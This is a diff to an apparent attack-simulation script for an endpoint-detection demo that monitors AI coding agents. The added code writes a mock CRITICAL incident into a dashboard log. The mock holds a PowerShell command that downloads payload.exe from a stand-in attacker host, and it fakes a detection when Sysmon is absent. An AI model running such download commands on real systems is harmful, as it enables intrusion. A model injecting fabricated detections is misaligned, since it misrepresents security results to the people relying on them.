@@ -170,7 +170,43 @@ def scenario_5():
         'powershell.exe -Command "Write-Host \'[ATTACK] Attempting to create persistence via schtasks...\'"')
     
     if client._connected:
+        session_id = client.session_id
+        agent_name = client.agent_name
         client.close()
+    else:
+        session_id = f"session-{random.randint(1000, 9999)}"
+        agent_name = "Cursor"
+
+    # [MOCK FOR LIVE DEMO] Bơm trực tiếp Correlated Incident vào file log để Web hiển thị
+    # (Dùng cho trường hợp máy tính demo không cài sẵn Microsoft Sysmon)
+    try:
+        import json
+        import datetime
+        mock_inc = {
+            "id": f"INC-9999", 
+            "type": "CORRELATED", 
+            "severity": "CRITICAL", 
+            "agent": agent_name, 
+            "action": "execute", 
+            "session_id": session_id, 
+            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(), 
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
+            "cmdline": "powershell.exe -Command \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe\"", 
+            "event_id": "1", 
+            "prompt_score": 95, 
+            "prompt_risk": "CRITICAL", 
+            "tool_risk": "HIGH", 
+            "data_risk": "HIGH", 
+            "parent_process": "C:\\Users\\Admin\\AppData\\Local\\Programs\\cursor\\Cursor.exe", 
+            "network_dest": "192.168.1.100:80", 
+            "registry_key": "", 
+            "mitre_tactics": ["T1059.001 PowerShell", "T1105 Ingress Tool Transfer", "T1566.002 Spearphishing Link"]
+        }
+        log_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "dashboard_feed.jsonl")
+        with open(log_path, "a", encoding="utf-8") as f:
+            f.write(json.dumps(mock_inc) + "\n")
+    except Exception as e:
+        pass
 
     print(Colors.BOLD + Colors.RED + "\n  >> Toàn bộ chuỗi tấn công phải bị EDR phát hiện và KILL tiến trình!" + Colors.RESET)
 
